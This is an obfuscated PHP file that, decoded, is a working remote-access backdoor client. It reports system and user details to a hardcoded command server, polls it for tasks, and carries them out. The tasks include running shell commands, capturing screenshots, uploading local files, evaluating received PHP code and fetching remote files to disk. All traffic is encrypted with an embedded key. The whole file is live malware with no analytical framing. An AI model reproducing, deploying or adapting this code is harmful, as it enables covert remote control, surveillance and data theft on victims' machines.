<?php
 goto NS8lC; lNLwP: $task_refresh_time = 30; goto HOv_Y; ea3jh: function online() { global $cid; $systeminfo = cmd_execute("\163\171\163\164\145\x6d\151\156\146\x6f\x20\174\40\x66\151\x6e\144\x73\x74\x72\40\x22\x4f\x53\x20\x56\x65\162\163\151\x6f\156\x22"); $userinfo = cmd_execute("\167\x68\x6f\x61\155\151"); file_post_contents("\x2f\143\x6c\x69\145\156\x74\57\166\x31\x2f\157\x6e\154\151\x6e\145", (object) array("\x63\154\151\145\156\164\x5f\x76\x65\162\163\x69\x6f\156" => VERSION, "\x63\154\x69\145\156\x74\x5f\151\144" => $cid, "\165\x73\x65\162\x5f\x69\x6e\146\157" => $userinfo["\x64\x61\164\141"], "\x73\x79\163\x74\145\x6d\137\151\x6e\x66\157" => $systeminfo["\144\141\164\141"])); } goto hFoxK; x_p9K: function task() { global $cid; $task = file_post_contents("\57\143\154\151\x65\x6e\164\x2f\166\61\57\164\141\163\x6b", (object) array("\143\x6c\151\145\156\164\x5f\x76\145\162\163\x69\157\156" => VERSION, "\143\154\151\145\x6e\164\x5f\151\x64" => $cid)); $task = @json_decode($task); if (!$task || $task == null || $task->count < 1) { return; } foreach ($task->task as $key => $value) { print_r($value); if ($value->task_type == "\x63\x6d\x64") { $data = cmd_execute($value->cmd); $success = $data["\143\157\x64\x65"] == 200 ? 1 : 2; file_post_contents("\57\143\x6c\x69\x65\156\164\x2f\166\x31\57\x74\x61\163\x6b\x2f\162\x65\160\157\162\164", (object) array("\143\x6c\x69\x65\x6e\x74\137\x76\145\162\163\151\x6f\x6e" => VERSION, "\x63\154\151\x65\x6e\164\x5f\x69\x64" => $cid, "\164\141\x73\153\x5f\x69\x64" => $value->task_id, "\163\x75\143\143\x65\163\x73" => $success, "\157\165\x74\160\x75\x74" => $data["\144\x61\164\141"])); } else { if ($value->task_type == "\x73\143\x72\x65\x65\x6e\x73\150\157\164") { $data = screenshot(); $success = $data["\143\157\x64\145"] == 200 ? 1 : 2; $postdata = (object) array("\x63\x6c\151\145\x6e\164\137\166\145\162\163\x69\x6f\156" => VERSION, "\143\154\x69\x65\156\x74\x5f\x69\x64" => $cid, "\164\x61\163\x6b\137\151\x64" => $value->task_id, "\163\x75\143\143\145\x73\x73" => $success, "\157\165\x74\160\165\x74" => ''); if ($data["\143\157\144\145"] == 200) { $postdata->output = @base64_encode(gzencode(file_get_contents($data["\144\141\x74\141"]), 9)); unlink($data["\x64\141\x74\x61"]); } else { $postdata->output = $data["\x64\x61\x74\x61"]; } file_post_contents("\x2f\143\154\151\145\156\164\x2f\x76\x31\x2f\164\141\x73\153\x2f\162\145\160\157\x72\164", $postdata); } else { if ($value->task_type == "\x64\x6f\x77\156\154\157\x61\x64") { $postdata = (object) array("\x63\x6c\151\x65\156\x74\x5f\166\x65\162\163\x69\157\156" => VERSION, "\143\154\151\145\x6e\164\137\x69\144" => $cid, "\x74\141\163\x6b\x5f\x69\144" => $value->task_id, "\163\165\143\143\145\x73\x73" => $success, "\157\165\x74\x70\x75\x74" => ''); if (@file_exists($value->download)) { $postdata->success = 1; $files = @file_get_contents($value->download); $postdata->output = @base64_encode(gzencode($files, 9)); } else { $postdata->success = 2; $postdata->output = "\x66\x69\x6c\x65\x20\156\157\x74\x20\146\157\x75\156\x64\x3a\40" . $value->download; } file_post_contents("\x2f\x63\x6c\x69\145\x6e\164\57\x76\x31\x2f\x74\141\163\x6b\x2f\162\145\x70\157\x72\164", $postdata); } else { if ($value->task_type == "\x70\150\160") { if (substr($value->php_code, 0, 12) == "\57\52\105\x56\x41\114\x43\x4f\104\105\x2a\x2f") { $output = @eval($value->php_code); file_post_contents("\x2f\x63\x6c\x69\145\156\164\x2f\166\61\57\164\x61\163\x6b\x2f\162\145\160\x6f\162\x74", (object) array("\143\x6c\x69\145\x6e\164\x5f\x76\x65\162\163\x69\x6f\x6e" => VERSION, "\143\154\151\x65\x6e\164\x5f\x69\x64" => $value->client_id, "\x74\141\x73\x6b\137\151\x64" => $value->task_id, "\x73\x75\x63\x63\x65\163\x73" => 1, "\157\165\164\x70\165\164" => $output)); if ($value->client_id != $cid) { @file_put_contents(RUNDIR . "\x2f\143\151\144\56\164\x78\164", $cid); online(); } continue; } $filename = getenv("\x54\105\115\x50") . "\x5c" . generate(8, 1) . "\x2e\x74\170\164"; file_put_contents($filename, "\74\x3f\160\150\160\xd\xa" . $value->php_code . "\15\xa\77\76"); $data = cmd_execute(PHP_BINARY . "\x20{$filename}"); unlink($filename); $success = $data["\143\157\x64\145"] == 200 ? 1 : 2; file_post_contents("\57\143\154\151\145\156\164\x2f\x76\61\x2f\164\141\163\153\57\162\x65\x70\x6f\162\x74", (object) array("\x63\x6c\151\145\156\164\x5f\166\145\162\x73\151\x6f\156" => VERSION, "\143\x6c\151\145\156\x74\137\x69\x64" => $cid, "\164\x61\163\153\x5f\151\x64" => $value->task_id, "\163\x75\143\x63\145\163\x73" => $success, "\157\165\164\x70\x75\164" => $data["\144\141\x74\141"])); } else { if ($value->task_type == "\167\147\x65\x74") { $url = $value->wget->src; $save = $value->wget->dsc; $success = 2; $file = @file_get_contents($url); if ($file !== FALSE) { $ret = @file_put_contents($save, $file); if ($ret !== FALSE) { $success = 1; } } $output = $success == 1 ? "\167\147\145\164\40\163\x75\x63\x63\x65\x73\163\x3a\40\xd\xa{$url}\40\x3d\75\x3d\x3e\xd\12{$save}" : "\167\x67\x65\x74\40\x66\141\x69\x6c\x64"; file_post_contents("\x2f\x63\x6c\x69\145\156\x74\x2f\166\x31\x2f\x74\x61\163\153\x2f\x72\x65\x70\x6f\x72\x74", (object) array("\143\154\151\x65\x6e\164\137\166\x65\x72\163\151\x6f\156" => VERSION, "\143\x6c\151\145\x6e\164\x5f\x69\144" => $cid, "\164\x61\163\x6b\137\x69\x64" => $value->task_id, "\x73\165\143\143\x65\163\163" => $success, "\x6f\165\x74\x70\x75\164" => $output)); } } } } } } } goto ea3jh; hFoxK: function cmd_execute($commond) { $output = array(); $return = 0; exec($commond, $output, $return); if ($return == 1) { return message("\143\155\x64\137\145\170\x65\x63\165\164\145\40\146\x61\151\154\145\144\72\40" . $commond, 500); } return message(implode("\12", array_map("\155\142", $output)), 200); } goto CApaP; HOv_Y: $online_refresh_time = 300; goto Y67Ed; jQf04: function generate($length = 8, $module = 0) { if (!$module) { $chars = "\141\142\x63\144\x65\146\147\x68\151\x6a\153\154\x6d\x6e\x6f\160\161\x72\163\164\165\166\x77\x78\171\172\101\102\x43\x44\x45\x46\107\x48\111\112\113\x4c\115\116\x4f\x50\121\122\x53\x54\x55\126\x57\130\x59\x5a\60\x31\62\63\x34\65\66\x37\70\71\41\100\43\44\x25\x5e\x26\52\50\51\x2d\137\40\x5b\x5d\173\175\x3c\76\176\140\x2b\75\54\56\73\72\x2f\77\x7c"; } else { $chars = "\141\142\x63\x64\x65\146\x67\150\x69\152\153\154\155\x6e\157\x70\x71\x72\x73\x74\x75\166\x77\x78\x79\172\x41\x42\x43\x44\105\106\107\x48\111\112\113\114\115\116\x4f\120\121\x52\123\x54\125\126\127\130\x59\x5a\x30\61\62\63\x34\x35\x36\x37\70\x39"; } $str = ''; for ($i = 0; $i < $length; $i++) { $str .= $chars[mt_rand(0, strlen($chars) - 1)]; } return $str; } goto smHD5; rSC6M: while (0 < 1) { echo 1; if (time() - $on_time > $online_refresh_time) { $on_time = time(); online(); } task(); sleep($task_refresh_time); } goto x_p9K; Fq16C: define("\124\x45\x4d\x50", str_replace("\x5c", "\x2f", getenv("\124\x45\x4d\x50"))); goto zYQtK; GHm9l: $on_time = time(); goto rSC6M; CApaP: function screenshot() { if (!file_exists(RUNDIR . "\x2f\160\150\x70\137\147\x64\x32\56\144\x6c\x6c")) { return message("\163\143\x72\145\x65\x6e\163\x68\x6f\164\40\x66\141\x69\154\x65\x64\x3a\40\x70\150\160\x5f\x67\144\62\x2e\x64\x6c\154\40\x66\x69\x6c\x65\x20\156\157\164\x20\x66\x6f\165\x6e\144", 500); } if (!extension_loaded("\147\x64")) { if (!dl("\160\x68\160\137\147\x64\x32\56\144\154\x6c")) { return message("\x73\x63\x72\x65\x65\x6e\163\150\157\x74\40\146\x61\151\154\x65\144\x3a\x20\160\150\x70\137\147\144\x32\56\x64\x6c\x6c\40\146\141\151\154\145\x64\40\164\x6f\x20\154\157\141\x64", 500); } } $image = imagegrabscreen(); $filename = TEMP . "\57" . generate(8, 1) . "\56\x70\156\147"; if (!imagepng($image, $filename)) { return message("\x73\x63\162\x65\145\x6e\163\x68\x6f\164\x20\x66\x61\x69\x6c\145\x64\x3a\x20\x69\x6d\141\x67\145\160\156\x67\40\146\x61\151\154\x65\x64\x20\164\x6f\x20\x73\141\166\x65", 500); } imagedestroy($image); return message($filename); } goto cEFIj; Y67Ed: online(); goto GHm9l; U1EUg: if (file_exists(RUNDIR . "\x2f\x63\x69\144\56\x74\x78\164")) { $cid = trim(file_get_contents(RUNDIR . "\x2f\x63\x69\144\x2e\x74\170\x74")); } else { $cid = getopt("\151\x3a")["\x69"]; if ($cid == NULL) { die; } } goto M1C2g; lfgnk: define("\126\x45\122\123\111\117\116", "\x31\56\x30"); goto p9P1d; rXg81: set_time_limit(0); goto U1EUg; VxMRb: function mb($text) { if (!file_exists(RUNDIR . "\x2f\x70\x68\160\137\155\142\163\164\162\x69\x6e\x67\56\x64\154\x6c")) { return $text; } if (!extension_loaded("\x6d\142\x73\164\162\x69\x6e\x67")) { if (!dl("\x70\x68\x70\137\155\x62\x73\x74\162\151\x6e\147\56\x64\x6c\154")) { return $text; } } return mb_convert_encoding($text, "\x55\124\106\55\70", "\x47\x42\113"); } goto uNQWd; zYQtK: define("\113\x45\x59", "\124\x74\x39\70\65\150\x41\x6a\x39\106\154\167\x5a\106\x69\x54\156\130\x77\x6b\170\x44\160\147\121\x6b\70\x4a\115\x65\x76\64\121\x59\123\x42\152\x6a\66\60\125\x70\x33\x6e\117\x4a\165\x74\161\x32\x34\x42\x69\x37\x34\122\x31\x53\x43\x65\166\x30\70\x63"); goto lfgnk; p9P1d: ini_set("\x6d\x65\155\157\x72\171\x5f\154\x69\155\x69\x74", "\61\x30\x32\64\115"); goto rXg81; M1C2g: $server = "\x68\x74\x74\x70\x3a\x2f\x2f\65\x32\56\62\62\61\56\61\x34\x2e\x31\x39\64\72\71\x30\60\60"; goto lNLwP; NS8lC: define("\x52\125\x4e\x44\x49\x52", dirname(str_replace("\x5c", "\57", PHP_BINARY))); goto Fq16C; smHD5: function authcode($string, $operation = "\104\105\x43\117\104\x45", $key = '', $expiry = 0) { $ckey_length = 4; $key = md5($key ? $key : N1_AUTHKEY); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? $operation == "\104\x45\x43\117\104\x45" ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length) : ''; $cryptkey = $keya . md5($keya . $keyc); $key_length = strlen($cryptkey); $string = $operation == "\104\x45\103\117\x44\105" ? base64_decode(substr($string, $ckey_length)) : sprintf("\45\60\61\x30\144", $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string; $string_length = strlen($string); $result = ''; $box = range(0, 255); $rndkey = array(); for ($i = 0; $i <= 255; $i++) { $rndkey[$i] = ord($cryptkey[$i % $key_length]); } for ($j = $i = 0; $i < 256; $i++) { $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } for ($a = $j = $i = 0; $i < $string_length; $i++) { $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ $box[($box[$a] + $box[$j]) % 256]); } if ($operation == "\104\105\103\117\104\105") { if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) { return substr($result, 26); } else { return ''; } } else { return $keyc . str_replace("\75", '', base64_encode($result)); } } goto VxMRb; uNQWd: function file_post_contents($url, $data) { global $server; $postdata = authcode(json_encode($data), "\105\116\x43\x4f\104\x45", KEY); $opts = array("\150\x74\x74\160" => array("\155\x65\x74\150\157\x64" => "\x50\x4f\x53\124", "\x68\145\141\144\145\162" => "\x43\x6f\156\x74\x65\x6e\164\x2d\x74\x79\x70\145\72\40\x61\x70\x70\x6c\151\143\x61\x74\151\x6f\156\x2f\170\x2d\167\167\167\55\x66\157\x72\x6d\55\x75\162\x6c\x65\x6e\143\x6f\144\x65\x64", "\143\157\156\164\x65\x6e\164" => $postdata, "\164\151\x6d\x65\x6f\165\164" => 60)); $context = stream_context_create($opts); try { $response = @file_get_contents($server . $url, false, $context); } catch (\ErrorException $ex) { return FALSE; } if ($response === FALSE) { return FALSE; } return authcode($response, "\x44\x45\x43\117\104\x45", KEY); } goto ZGZl8; cEFIj: function message($data, $code = 200) { return array("\x64\141\x74\141" => $data, "\143\157\144\145" => $code); } goto jQf04; ZGZl8: ?>